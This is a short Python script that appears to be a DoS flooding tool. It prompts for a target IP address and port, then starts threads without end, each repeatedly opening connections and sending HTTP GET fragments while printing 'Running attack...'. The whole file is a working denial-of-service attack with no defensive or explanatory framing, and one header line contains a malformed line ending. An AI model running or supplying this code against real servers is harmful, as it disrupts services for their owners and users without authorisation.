import threading
import socket


class RequestInstance(threading.Thread):

    def set(self, ip, port):
        self.ip = ip
        self.port = port

    def run(self):
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((self.ip, self.port))
                s.send("GET / HTTP/1.1\r\n".encode())
                s.send(("HOST: " + self.ip + "/r/n/r/n").encode())
                s.close()
            except socket.error:
                print('Server Down\n', end='')


class Main:

    def __init__(self):
        self.main()

    def main(self):
        ip = input('Enter ip address: ')
        port = int(input('Enter port number: '))
                
        while True:
            rq = RequestInstance()
            rq.set(ip, port)
            try:
                rq.start()
                print('Running attack...\n',end='')
            except:
                pass

Main()
